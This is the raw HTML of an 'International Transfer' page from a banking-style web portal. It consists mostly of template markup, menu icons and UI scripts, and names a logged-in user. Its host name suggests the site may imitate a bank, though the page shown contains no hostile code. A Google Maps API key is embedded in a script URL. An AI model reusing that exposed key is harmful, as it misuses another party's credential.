
 


<!doctype html>
<html lang="en-gb">

<!-- START INCLUDE HEAD -->
<head>
<meta charset="utf-8" />
	<base href="https://securedboa.ibt.in.net/app/transfer/international-transfer" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-u" />
	<title>International Transfer</title>
	<link href="/app/templates/online/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
	<link href="https://securedboa.ibt.in.net/app/plugins/system/modalmessages/assets/css/style.css" rel="stylesheet" />
	<link href="/app/templates/online/assets/plugins/custom/datatables/datatables.bundle.css" rel="stylesheet" />
	<link href="/app/templates/online/assets/plugins/custom/fullcalendar/fullcalendar.bundle.css" rel="stylesheet" />
	<link href="/app/templates/online/assets/plugins/global/plugins.bundle.css" rel="stylesheet" />
	<link href="/app/templates/online/assets/plugins/custom/prismjs/prismjs.bundle.css" rel="stylesheet" />
	<link href="/app/templates/online/assets/css/style.bundle.css" rel="stylesheet" />
	<link href="/app/templates/online/assets/css/custom.css" rel="stylesheet" />
	<link href="/app/templates/online/assets/css/themes/layout/header/base/dark.css?v=7.0.3" rel="stylesheet" />
	<link href="/app/templates/online/assets/css/themes/layout/header/menu/dark.css?v=7.0.3" rel="stylesheet" />
	<link href="/app/templates/online/assets/css/themes/layout/brand/dark.css?v=7.0.3" rel="stylesheet" />
	<link href="/app/templates/online/assets/css/themes/layout/aside/dark.css?v=7.0.3" rel="stylesheet" />
	<link href="https://securedboa.ibt.in.net/app/libraries/cegcore2/assets/semantic-ui/reset.inline.min.css" rel="stylesheet" />
	<link href="https://securedboa.ibt.in.net/app/libraries/cegcore2/assets/semantic-ui/site.inline.min.css" rel="stylesheet" />
	<link href="https://securedboa.ibt.in.net/app/libraries/cegcore2/assets/semantic-ui/semantic.min.css" rel="stylesheet" />
	<link href="https://securedboa.ibt.in.net/app/libraries/cegcore2/assets/semantic-ui/text.css" rel="stylesheet" />
	<link href="https://securedboa.ibt.in.net/app/libraries/cegcore2/assets/semantic-ui/fixes.semantic.css" rel="stylesheet" />
	<style>

#goog-gt-tt {display:none !important;}
.goog-te-banner-frame {display:none !important;}
.goog-te-menu-value:hover {text-decoration:none !important;}
body {top:0 !important;}
#google_translate_element2 {display:none!important;}

        a.glink {text-decoration:none;}
        a.glink img {vertical-align:middle;padding:0;margin:0;border:0;display:inline;height:32px;opacity:0.8;}
        a.glink:hover img {opacity:1;}
        a.glink span {margin-right:5px;font-size:15px;vertical-align:middle;}

        .gt_black_overlay {display:none;position:fixed;top:0%;left:0%;width:100%;height:100%;background-color:black;z-index:2017;-moz-opacity:0.8;opacity:.80;filter:alpha(opacity=80);}
        .gt_white_content {display:none;position:fixed;top:50%;left:50%;width:980px;height:375px;margin:-189px 0 0 -980px;padding:6px 16px;border-radius:5px;background-color:white;color:black;z-index:19881205;overflow:auto;text-align:left;}
        .gt_white_content a {display:block;padding:5px 0;border-bottom:1px solid #e7e7e7;white-space:nowrap;}
        .gt_white_content a:last-of-type {border-bottom:none;}
        .gt_white_content a.selected {background-color:#ffc;}
        .gt_white_content .gt_languages {column-count:1;column-gap:10px;}
        .gt_white_content::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 3px rgba(0,0,0,0.3);border-radius:5px;background-color:#F5F5F5;}
        .gt_white_content::-webkit-scrollbar {width:5px;}
        .gt_white_content::-webkit-scrollbar-thumb {border-radius:5px;-webkit-box-shadow: inset 0 0 3px rgba(0,0,0,.3);background-color:#888;}
    
	</style>
	<script src="https://securedboa.ibt.in.net/app/plugins/system/modalmessages/assets/js/script.js"></script>
	<script src="/app/media/jui/js/jquery.min.js?3abbfd0fbc73c67262da1a9de39c3cd4"></script>
	<script src="/app/media/jui/js/jquery-noconflict.js?3abbfd0fbc73c67262da1a9de39c3cd4"></script>
	<script src="/app/media/jui/js/jquery-migrate.min.js?3abbfd0fbc73c67262da1a9de39c3cd4"></script>
	<script src="/app/templates/online/assets/plugins/global/plugins.bundle.js"></script>
	<script src="/app/templates/online/assets/plugins/custom/prismjs/prismjs.bundle.js"></script>
	<script src="/app/templates/online/assets/js/scripts.bundle.js"></script>
	<script src="/app/templates/online/assets/plugins/custom/fullcalendar/fullcalendar.bundle.js"></script>
	<script src="//maps.google.com/maps/api/js?key=AIzaSyBTGnKT7dt597vo9QgeQ7BFhvSRP4eiMSM"></script>
	<script src="/app/templates/online/assets/plugins/custom/gmaps/gmaps.js"></script>
	<script src="/app/templates/online/assets/plugins/custom/datatables/datatables.bundle.js"></script>
	<script src="/app/templates/online/assets/js/custom.js"></script>
	<script src="https://securedboa.ibt.in.net/app/libraries/cegcore2/assets/semantic-ui/semantic.min.js"></script>
	<script src="https://securedboa.ibt.in.net/app/libraries/cegcore2/assets/js/g2.js"></script>
	<script src="https://securedboa.ibt.in.net/app/libraries/cegcore2/assets/js/g2.boot.js"></script>
	<script>
jQuery(document).ready(function() { if (jQuery("#modal-messages").length) modalMessages("1", "both", "", "fast"); });
        var flag_size = parseInt(32);
        var popup_height = 25 + 58 * ((flag_size > 16 ? flag_size : 20) + 10 + 1);
        var popup_columns = Math.ceil(popup_height / 375);
        if(popup_height > 375)
            popup_height = 375;
        var popup_width = popup_columns * (326 + 15);

        if(popup_width > jQuery(window).width()) {
            popup_width = jQuery(window).width() - 120;
            popup_columns = Math.floor(popup_width/(326 + 15));
        }

        if(popup_width > 980)
            popup_width = 980;
        if(popup_columns > 5)
            popup_columns = 5;

        function openGTPopup(a) {jQuery('.gt_white_content a img').each(function() {if(!jQuery(this)[0].hasAttribute('src'))jQuery(this).attr('src', jQuery(this).attr('data-gt-lazy-src'))});if(a === undefined){document.getElementById('gt_lightbox').style.display='block';document.getElementById('gt_fade').style.display='block';}else{jQuery(a).parent().find('#gt_lightbox').css('display', 'block');jQuery(a).parent().find('#gt_fade').css('display', 'block');}}
        function closeGTPopup() {jQuery('.gt_white_content').css('display', 'none');jQuery('.gt_black_overlay').css('display', 'none');}
        function changeGTLanguage(pair, a) {doGTranslate(pair);jQuery('a.switcher-popup').html(jQuery(a).html()+'<span style="color:#666;font-size:8px;font-weight:bold;">&#9660;</span>');closeGTPopup();}
        jQuery(document).ready(function() {
            jQuery('.gt_white_content').css('width', popup_width+'px');
            jQuery('.gt_white_content').css('height', popup_height+'px');
            jQuery('.gt_white_content').css('margin', '-'+(popup_height/2)+'px 0 0 -'+(popup_width/2)+'px');
            jQuery('.gt_white_content .gt_languages').css('column-count', popup_columns);

            jQuery('.gt_black_overlay').click(function(e) {if(jQuery('.gt_white_content').is(':visible')) {closeGTPopup()}});
        });
    
jQuery(document).ready(function() {if(GTranslateGetCurrentLang() != null){var lang_html = jQuery(".gt_languages a[onclick*='|"+GTranslateGetCurrentLang()+"']").html();if(typeof lang_html != 'undefined')jQuery('a.switcher-popup').html(lang_html.replace('data-gt-lazy-', '')+'<span style="color:#666;font-size:8px;font-weight:bold;">&#9660;</span>');}});
			jQuery(document).ready(function($){
				$.G2.boot.ready();
			});
		
jQuery(document).ready(function($){

});
	</script>
	<script type="text/javascript">
		jQuery(document).ready(function($){$("div.G2-joomla").trigger("contentChange");});
		</script>

</head>
<!-- END INCLUDE HEAD -->

	<!--end::Head-->
	<!--begin::Body-->
	<body id="kt_body" class="header-fixed header-mobile-fixed subheader-enabled subheader-fixed aside-enabled aside-fixed aside-minimize-hoverable page-loading">
		
		<!--begin::Main-->
		<!--begin::Header Mobile-->
		<div id="kt_header_mobile" class="header-mobile align-items-center header-mobile-fixed">
			
			<!--begin::Logo-->
			                    <div class="semanticui-body G2-joomla chronoforms  index">
	<a href="/app/dashboard" class="brand-logo light">
							<img alt="Logo" src="https://cdn.e-platforms.xyz/400364783a1a42ff9-913d-4289-ba7f-e7649c036cc4.png" height="36px"/>
						</a>

</div><a href="http://www.chronoengine.com/" target="_blank" class="chronoforms6_credits">Form by ChronoForms - ChronoEngine.com</a>
             			<!--end::Logo-->
			
			<!--begin::Toolbar-->
			<div class="d-flex align-items-center">
				<!--begin::Aside Mobile Toggle-->
				<button class="btn p-0 burger-icon burger-icon-left" id="kt_aside_mobile_toggle">
					<span></span>
				</button>
				<!--end::Aside Mobile Toggle-->
				<!--begin::Topbar Mobile Toggle-->
				<button class="btn btn-hover-text-primary p-0 ml-2" id="kt_header_mobile_topbar_toggle">
					<span class="svg-icon svg-icon-xl">
						<!--begin::Svg Icon | path:assets/media/svg/icons/General/User.svg-->
						<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
							<g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
								<polygon points="0 0 24 0 24 24 0 24" />
								<path d="M12,11 C9.790861,11 8,9.209139 8,7 C8,4.790861 9.790861,3 12,3 C14.209139,3 16,4.790861 16,7 C16,9.209139 14.209139,11 12,11 Z" fill="#000000" fill-rule="nonzero" opacity="0.3" />
								<path d="M3.00065168,20.1992055 C3.38825852,15.4265159 7.26191235,13 11.9833413,13 C16.7712164,13 20.7048837,15.2931929 20.9979143,20.2 C21.0095879,20.3954741 20.9979143,21 20.2466999,21 C16.541124,21 11.0347247,21 3.72750223,21 C3.47671215,21 2.97953825,20.45918 3.00065168,20.1992055 Z" fill="#000000" fill-rule="nonzero" />
							</g>
						</svg>
						<!--end::Svg Icon-->
					</span>
				</button>
				<!--end::Topbar Mobile Toggle-->
			</div>
			<!--end::Toolbar-->
		</div>
		<!--end::Header Mobile-->
		<div class="d-flex flex-column flex-root">
			<!--begin::Page-->
			<div class="d-flex flex-row flex-column-fluid page">
				<!--begin::Aside-->
				<div class="aside aside-left aside-fixed d-flex flex-column flex-row-auto" id="kt_aside">
					<!--begin::Brand-->
					<div class="brand flex-column-auto" id="kt_brand">
						
						<!--begin::Logo-->
						                   <div class="semanticui-body G2-joomla chronoforms  index">
	<a href="/app/dashboard" class="brand-logo light">
							<img alt="Logo" src="https://cdn.e-platforms.xyz/400364783a1a42ff9-913d-4289-ba7f-e7649c036cc4.png" height="36px"/>
						</a>

</div><a href="http://www.chronoengine.com/" target="_blank" class="chronoforms6_credits">Form by ChronoForms - ChronoEngine.com</a>
             						<!--end::Logo-->
						
						<!--begin::Toggle-->
						<button class="brand-toggle btn btn-sm px-0" id="kt_aside_toggle">
							<span class="svg-icon svg-icon svg-icon-xl">
								<!--begin::Svg Icon | path:assets/media/svg/icons/Navigation/Angle-double-left.svg-->
								<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
									<g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
										<polygon points="0 0 24 0 24 24 0 24" />
										<path d="M5.29288961,6.70710318 C4.90236532,6.31657888 4.90236532,5.68341391 5.29288961,5.29288961 C5.68341391,4.90236532 6.31657888,4.90236532 6.70710318,5.29288961 L12.7071032,11.2928896 C13.0856821,11.6714686 13.0989277,12.281055 12.7371505,12.675721 L7.23715054,18.675721 C6.86395813,19.08284 6.23139076,19.1103429 5.82427177,18.7371505 C5.41715278,18.3639581 5.38964985,17.7313908 5.76284226,17.3242718 L10.6158586,12.0300721 L5.29288961,6.70710318 Z" fill="#000000" fill-rule="nonzero" transform="translate(8.999997, 11.999999) scale(-1, 1) translate(-8.999997, -11.999999)" />
										<path d="M10.7071009,15.7071068 C10.3165766,16.0976311 9.68341162,16.0976311 9.29288733,15.7071068 C8.90236304,15.3165825 8.90236304,14.6834175 9.29288733,14.2928932 L15.2928873,8.29289322 C15.6714663,7.91431428 16.2810527,7.90106866 16.6757187,8.26284586 L22.6757187,13.7628459 C23.0828377,14.1360383 23.1103407,14.7686056 22.7371482,15.1757246 C22.3639558,15.5828436 21.7313885,15.6103465 21.3242695,15.2371541 L16.0300699,10.3841378 L10.7071009,15.7071068 Z" fill="#000000" fill-rule="nonzero" opacity="0.3" transform="translate(15.999997, 11.999999) scale(-1, 1) rotate(-270.000000) translate(-15.999997, -11.999999)" />
									</g>
								</svg>
								<!--end::Svg Icon-->
							</span>
						</button>
						<!--end::Toolbar-->
					</div>
					<!--end::Brand-->
					
					
					<!--begin::Aside Menu-->
					<div class="aside-menu-wrapper flex-column-fluid" id="kt_aside_menu_wrapper">
						<!--begin::Menu Container-->
						<div id="kt_aside_menu" class="aside-menu my-4" data-menu-vertical="1" data-menu-scroll="1" data-menu-dropdown-timeout="500">
			
							
							<!--begin::Menu Nav-->
							
							<!--begin::Header Nav-->
							                        					  <div class="semanticui-body G2-joomla chronoforms  index">
											<ul class="menu-nav">
											
																<li class="menu-section">
									<h4 class="menu-text">My Account</h4>
									<i class="menu-icon ki ki-bold-more-hor icon-md"></i>
								</li>
											<li class="menu-item menu-item-submenu " data-menu-toggle="hover" aria-haspopup="true">
															<a href="/app/dashboard" class="menu-link">

<span class="svg-icon menu-icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <rect x="0" y="0" width="24" height="24"/>
        <rect fill="#000000" opacity="0.3" x="4" y="4" width="4" height="4" rx="1"/>
        <path d="M5,10 L7,10 C7.55228475,10 8,10.4477153 8,11 L8,13 C8,13.5522847 7.55228475,14 7,14 L5,14 C4.44771525,14 4,13.5522847 4,13 L4,11 C4,10.4477153 4.44771525,10 5,10 Z M11,4 L13,4 C13.5522847,4 14,4.44771525 14,5 L14,7 C14,7.55228475 13.5522847,8 13,8 L11,8 C10.4477153,8 10,7.55228475 10,7 L10,5 C10,4.44771525 10.4477153,4 11,4 Z M11,10 L13,10 C13.5522847,10 14,10.4477153 14,11 L14,13 C14,13.5522847 13.5522847,14 13,14 L11,14 C10.4477153,14 10,13.5522847 10,13 L10,11 C10,10.4477153 10.4477153,10 11,10 Z M17,4 L19,4 C19.5522847,4 20,4.44771525 20,5 L20,7 C20,7.55228475 19.5522847,8 19,8 L17,8 C16.4477153,8 16,7.55228475 16,7 L16,5 C16,4.44771525 16.4477153,4 17,4 Z M17,10 L19,10 C19.5522847,10 20,10.4477153 20,11 L20,13 C20,13.5522847 19.5522847,14 19,14 L17,14 C16.4477153,14 16,13.5522847 16,13 L16,11 C16,10.4477153 16.4477153,10 17,10 Z M5,16 L7,16 C7.55228475,16 8,16.4477153 8,17 L8,19 C8,19.5522847 7.55228475,20 7,20 L5,20 C4.44771525,20 4,19.5522847 4,19 L4,17 C4,16.4477153 4.44771525,16 5,16 Z M11,16 L13,16 C13.5522847,16 14,16.4477153 14,17 L14,19 C14,19.5522847 13.5522847,20 13,20 L11,20 C10.4477153,20 10,19.5522847 10,19 L10,17 C10,16.4477153 10.4477153,16 11,16 Z M17,16 L19,16 C19.5522847,16 20,16.4477153 20,17 L20,19 C20,19.5522847 19.5522847,20 19,20 L17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,16.4477153 16.4477153,16 17,16 Z" fill="#000000"/>
    </g>
</svg><!--end::Svg Icon--></span>



																<span class="menu-text">Dashboard</span>
																<span class="menu-label">
																	
																</span>
															</a>
														</li>
																												<li class="menu-item menu-item-submenu " data-menu-toggle="hover" aria-haspopup="true">
															<a href="/app/transaction-history" class="menu-link">
																<span class="svg-icon menu-icon">
																	<!--begin::Svg Icon | path:assets/media/svg/icons/Communication/Add-user.svg-->
																	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
																		<g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <rect x="0" y="0" width="24" height="24"/>
        <path d="M8,3 L8,3.5 C8,4.32842712 8.67157288,5 9.5,5 L14.5,5 C15.3284271,5 16,4.32842712 16,3.5 L16,3 L18,3 C19.1045695,3 20,3.8954305 20,5 L20,21 C20,22.1045695 19.1045695,23 18,23 L6,23 C4.8954305,23 4,22.1045695 4,21 L4,5 C4,3.8954305 4.8954305,3 6,3 L8,3 Z" fill="#000000" opacity="0.3"/>
        <path d="M10.875,15.75 C10.6354167,15.75 10.3958333,15.6541667 10.2041667,15.4625 L8.2875,13.5458333 C7.90416667,13.1625 7.90416667,12.5875 8.2875,12.2041667 C8.67083333,11.8208333 9.29375,11.8208333 9.62916667,12.2041667 L10.875,13.45 L14.0375,10.2875 C14.4208333,9.90416667 14.9958333,9.90416667 15.3791667,10.2875 C15.7625,10.6708333 15.7625,11.2458333 15.3791667,11.6291667 L11.5458333,15.4625 C11.3541667,15.6541667 11.1145833,15.75 10.875,15.75 Z" fill="#000000"/>
        <path d="M11,2 C11,1.44771525 11.4477153,1 12,1 C12.5522847,1 13,1.44771525 13,2 L14.5,2 C14.7761424,2 15,2.22385763 15,2.5 L15,3.5 C15,3.77614237 14.7761424,4 14.5,4 L9.5,4 C9.22385763,4 9,3.77614237 9,3.5 L9,2.5 C9,2.22385763 9.22385763,2 9.5,2 L11,2 Z" fill="#000000"/>
    </g>
																	</svg>
																	<!--end::Svg Icon-->
																</span>
																<span class="menu-text">Transaction Logs</span>
															
															</a>
														</li>
														<li class="menu-item menu-item-submenu " data-menu-toggle="hover" aria-haspopup="true">
															<a href="/app/account-statement" class="menu-link">
																<span class="svg-icon menu-icon">
																	<!--begin::Svg Icon | path:assets/media/svg/icons/Communication/Add-user.svg-->
																	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
																		<g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <rect x="0" y="0" width="24" height="24"/>
        <circle fill="#000000" opacity="0.3" cx="20.5" cy="12.5" r="1.5"/>
        <rect fill="#000000" opacity="0.3" transform="translate(12.000000, 6.500000) rotate(-15.000000) translate(-12.000000, -6.500000) " x="3" y="3" width="18" height="7" rx="1"/>
        <path d="M22,9.33681558 C21.5453723,9.12084552 21.0367986,9 20.5,9 C18.5670034,9 17,10.5670034 17,12.5 C17,14.4329966 18.5670034,16 20.5,16 C21.0367986,16 21.5453723,15.8791545 22,15.6631844 L22,18 C22,19.1045695 21.1045695,20 20,20 L4,20 C2.8954305,20 2,19.1045695 2,18 L2,6 C2,4.8954305 2.8954305,4 4,4 L20,4 C21.1045695,4 22,4.8954305 22,6 L22,9.33681558 Z" fill="#000000"/>
    </g>
																	</svg>
																	<!--end::Svg Icon-->
																</span>
																<span class="menu-text">Account Statement</span>
																
															</a>
														</li>

																					<li class="menu-section">
									<h4 class="menu-text">Transfers</h4>
									<i class="menu-icon ki ki-bold-more-hor icon-md"></i>
								</li>
										
														<li class="menu-item menu-item-submenu " data-menu-toggle="hover" aria-haspopup="true">
															<a href="/app/transfer-funds" class="menu-link">
																<span class="svg-icon menu-icon">
																	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <rect x="0" y="0" width="24" height="24"/>
        <path d="M8,13.1668961 L20.4470385,11.9999863 L8,10.8330764 L8,5.77181995 C8,5.70108058 8.01501031,5.63114635 8.04403925,5.56663761 C8.15735832,5.31481744 8.45336217,5.20254012 8.70518234,5.31585919 L22.545552,11.5440255 C22.6569791,11.5941677 22.7461882,11.6833768 22.7963304,11.794804 C22.9096495,12.0466241 22.7973722,12.342628 22.545552,12.455947 L8.70518234,18.6841134 C8.64067359,18.7131423 8.57073936,18.7281526 8.5,18.7281526 C8.22385763,18.7281526 8,18.504295 8,18.2281526 L8,13.1668961 Z" fill="#000000"/>
        <path d="M4,16 L5,16 C5.55228475,16 6,16.4477153 6,17 C6,17.5522847 5.55228475,18 5,18 L4,18 C3.44771525,18 3,17.5522847 3,17 C3,16.4477153 3.44771525,16 4,16 Z M1,11 L5,11 C5.55228475,11 6,11.4477153 6,12 C6,12.5522847 5.55228475,13 5,13 L1,13 C0.44771525,13 6.76353751e-17,12.5522847 0,12 C-6.76353751e-17,11.4477153 0.44771525,11 1,11 Z M4,6 L5,6 C5.55228475,6 6,6.44771525 6,7 C6,7.55228475 5.55228475,8 5,8 L4,8 C3.44771525,8 3,7.55228475 3,7 C3,6.44771525 3.44771525,6 4,6 Z" fill="#000000" opacity="0.3"/>
    </g>
</svg><!--end::Svg Icon--></span>
																</span>
																<span class="menu-text">Transfers</span>
																
															</a>
														</li>

																					<li class="menu-section">
									<h4 class="menu-text">Currency Tools</h4>
									<i class="menu-icon ki ki-bold-more-hor icon-md"></i>
								</li>
										
														<li class="menu-item menu-item-submenu " data-menu-toggle="hover" aria-haspopup="true">
															<a href="/app/global-currency-rates" class="menu-link">
																<span class="svg-icon menu-icon">
																	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <rect x="0" y="0" width="24" height="24"/>
        <path d="M8,13.1668961 L20.4470385,11.9999863 L8,10.8330764 L8,5.77181995 C8,5.70108058 8.01501031,5.63114635 8.04403925,5.56663761 C8.15735832,5.31481744 8.45336217,5.20254012 8.70518234,5.31585919 L22.545552,11.5440255 C22.6569791,11.5941677 22.7461882,11.6833768 22.7963304,11.794804 C22.9096495,12.0466241 22.7973722,12.342628 22.545552,12.455947 L8.70518234,18.6841134 C8.64067359,18.7131423 8.57073936,18.7281526 8.5,18.7281526 C8.22385763,18.7281526 8,18.504295 8,18.2281526 L8,13.1668961 Z" fill="#000000"/>
        <path d="M4,16 L5,16 C5.55228475,16 6,16.4477153 6,17 C6,17.5522847 5.55228475,18 5,18 L4,18 C3.44771525,18 3,17.5522847 3,17 C3,16.4477153 3.44771525,16 4,16 Z M1,11 L5,11 C5.55228475,11 6,11.4477153 6,12 C6,12.5522847 5.55228475,13 5,13 L1,13 C0.44771525,13 6.76353751e-17,12.5522847 0,12 C-6.76353751e-17,11.4477153 0.44771525,11 1,11 Z M4,6 L5,6 C5.55228475,6 6,6.44771525 6,7 C6,7.55228475 5.55228475,8 5,8 L4,8 C3.44771525,8 3,7.55228475 3,7 C3,6.44771525 3.44771525,6 4,6 Z" fill="#000000" opacity="0.3"/>
    </g>
</svg><!--end::Svg Icon--></span>
																</span>
																<span class="menu-text">Global Currency Rates</span>
																
															</a>
														</li>


<li class="menu-item menu-item-submenu " data-menu-toggle="hover" aria-haspopup="true">
															<a href="/app/currency-converter" class="menu-link">
																<span class="svg-icon menu-icon">
																	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <rect x="0" y="0" width="24" height="24"/>
        <path d="M8,13.1668961 L20.4470385,11.9999863 L8,10.8330764 L8,5.77181995 C8,5.70108058 8.01501031,5.63114635 8.04403925,5.56663761 C8.15735832,5.31481744 8.45336217,5.20254012 8.70518234,5.31585919 L22.545552,11.5440255 C22.6569791,11.5941677 22.7461882,11.6833768 22.7963304,11.794804 C22.9096495,12.0466241 22.7973722,12.342628 22.545552,12.455947 L8.70518234,18.6841134 C8.64067359,18.7131423 8.57073936,18.7281526 8.5,18.7281526 C8.22385763,18.7281526 8,18.504295 8,18.2281526 L8,13.1668961 Z" fill="#000000"/>
        <path d="M4,16 L5,16 C5.55228475,16 6,16.4477153 6,17 C6,17.5522847 5.55228475,18 5,18 L4,18 C3.44771525,18 3,17.5522847 3,17 C3,16.4477153 3.44771525,16 4,16 Z M1,11 L5,11 C5.55228475,11 6,11.4477153 6,12 C6,12.5522847 5.55228475,13 5,13 L1,13 C0.44771525,13 6.76353751e-17,12.5522847 0,12 C-6.76353751e-17,11.4477153 0.44771525,11 1,11 Z M4,6 L5,6 C5.55228475,6 6,6.44771525 6,7 C6,7.55228475 5.55228475,8 5,8 L4,8 C3.44771525,8 3,7.55228475 3,7 C3,6.44771525 3.44771525,6 4,6 Z" fill="#000000" opacity="0.3"/>
    </g>
</svg><!--end::Svg Icon--></span>
																</span>
																<span class="menu-text">Currency Converter</span>
																
															</a>
														</li>

																					<li class="menu-section">
									<h4 class="menu-text">Support</h4>
									<i class="menu-icon ki ki-bold-more-hor icon-md"></i>
								</li>
																		

<li class="menu-item menu-item-submenu " data-menu-toggle="hover" aria-haspopup="true">
															<a href="/app/change-password" class="menu-link">
																<span class="svg-icon menu-icon">
																	<!--begin::Svg Icon | path:assets/media/svg/icons/Communication/Add-user.svg-->
																	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
																		<g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <polygon points="0 0 24 0 24 24 0 24"/>
        <path d="M12,11 C9.790861,11 8,9.209139 8,7 C8,4.790861 9.790861,3 12,3 C14.209139,3 16,4.790861 16,7 C16,9.209139 14.209139,11 12,11 Z" fill="#000000" fill-rule="nonzero" opacity="0.3"/>
        <path d="M3.00065168,20.1992055 C3.38825852,15.4265159 7.26191235,13 11.9833413,13 C16.7712164,13 20.7048837,15.2931929 20.9979143,20.2 C21.0095879,20.3954741 20.9979143,21 20.2466999,21 C16.541124,21 11.0347247,21 3.72750223,21 C3.47671215,21 2.97953825,20.45918 3.00065168,20.1992055 Z" fill="#000000" fill-rule="nonzero"/>
    </g>
																	</svg>
																	<!--end::Svg Icon-->
																</span>
																<span class="menu-text">Change Password</span>
															
															</a>
														</li>

<li class="menu-item menu-item-submenu " data-menu-toggle="hover" aria-haspopup="true">
															<a href="/app/log-out" class="menu-link">
																<span class="svg-icon menu-icon">
																	<!--begin::Svg Icon | path:assets/media/svg/icons/Communication/Add-user.svg-->
																	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24px" height="24px" viewBox="0 0 24 24" version="1.1">
																		<g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <rect x="0" y="0" width="24" height="24"/>
        <path d="M14.0069431,7.00607258 C13.4546584,7.00607258 13.0069431,6.55855153 13.0069431,6.00650634 C13.0069431,5.45446114 13.4546584,5.00694009 14.0069431,5.00694009 L15.0069431,5.00694009 C17.2160821,5.00694009 19.0069431,6.7970243 19.0069431,9.00520507 L19.0069431,15.001735 C19.0069431,17.2099158 17.2160821,19 15.0069431,19 L3.00694311,19 C0.797804106,19 -0.993056895,17.2099158 -0.993056895,15.001735 L-0.993056895,8.99826498 C-0.993056895,6.7900842 0.797804106,5 3.00694311,5 L4.00694793,5 C4.55923268,5 5.00694793,5.44752105 5.00694793,5.99956624 C5.00694793,6.55161144 4.55923268,6.99913249 4.00694793,6.99913249 L3.00694311,6.99913249 C1.90237361,6.99913249 1.00694311,7.89417459 1.00694311,8.99826498 L1.00694311,15.001735 C1.00694311,16.1058254 1.90237361,17.0008675 3.00694311,17.0008675 L15.0069431,17.0008675 C16.1115126,17.0008675 17.0069431,16.1058254 17.0069431,15.001735 L17.0069431,9.00520507 C17.0069431,7.90111468 16.1115126,7.00607258 15.0069431,7.00607258 L14.0069431,7.00607258 Z" fill="#000000" fill-rule="nonzero" opacity="0.3" transform="translate(9.006943, 12.000000) scale(-1, 1) rotate(-90.000000) translate(-9.006943, -12.000000) "/>
        <rect fill="#000000" opacity="0.3" transform="translate(14.000000, 12.000000) rotate(-270.000000) translate(-14.000000, -12.000000) " x="13" y="6" width="2" height="12" rx="1"/>
        <path d="M21.7928932,9.79289322 C22.1834175,9.40236893 22.8165825,9.40236893 23.2071068,9.79289322 C23.5976311,10.1834175 23.5976311,10.8165825 23.2071068,11.2071068 L20.2071068,14.2071068 C19.8165825,14.5976311 19.1834175,14.5976311 18.7928932,14.2071068 L15.7928932,11.2071068 C15.4023689,10.8165825 15.4023689,10.1834175 15.7928932,9.79289322 C16.1834175,9.40236893 16.8165825,9.40236893 17.2071068,9.79289322 L19.5,12.0857864 L21.7928932,9.79289322 Z" fill="#000000" fill-rule="nonzero" transform="translate(19.500000, 12.000000) rotate(-90.000000) translate(-19.500000, -12.000000) "/>
    </g>
																	</svg>
																	<!--end::Svg Icon-->
																</span>
																<span class="menu-text">Log Out</span>
															
															</a>
														</li>

																							
											

									</ul>	
</div><a href="http://www.chronoengine.com/" target="_blank" class="chronoforms6_credits">Form by ChronoForms - ChronoEngine.com</a>
                       					 							<!--end::Header Nav-->
		
							<!--end::Menu Nav-->
						</div>
						<!--end::Menu Container-->
					</div>
					<!--end::Aside Menu-->
				</div>
				<!--end::Aside-->
				

				
				<!--begin::Wrapper-->
				<div class="d-flex flex-column flex-row-fluid wrapper" id="kt_wrapper">
					<!--begin::Header-->
					<div id="kt_header" class="header header-fixed">
						<!--begin::Container-->
						<div class="container-fluid d-flex align-items-stretch justify-content-between">
							<div></div>
							
							
							
							
							
							
							
							<!--begin::Topbar-->
								<div class="topbar">
								                        <div class="row">
                                    <div class="semanticui-body G2-joomla chronoforms  index">
	<!--begin::User-->
								<div class="topbar-item">
									<div class="btn btn-icon w-auto  d-flex align-items-center btn-lg px-2" id="kt_quick_user_toggle">
										<span class="text-white opacity-70 font-weight-bold font-size-base d-none d-md-inline mr-1">Hi,</span>
										<span class="text-white opacity-90 font-weight-bolder font-size-base d-none d-md-inline mr-4">Justin Schenk</span>
										<span class="symbol symbol-35 symbol-light-success">
											<span class="symbol-label font-size-h5 font-weight-bold">S</span>
										</span>
									</div>
								</div>
								<!--end::User--><!-- begin::User Panel-->
		<div id="kt_quick_user" class="offcanvas offcanvas-right p-10">
			<!--begin::Header-->
			<div class="offcanvas-header d-flex align-items-center justify-content-between pb-5">
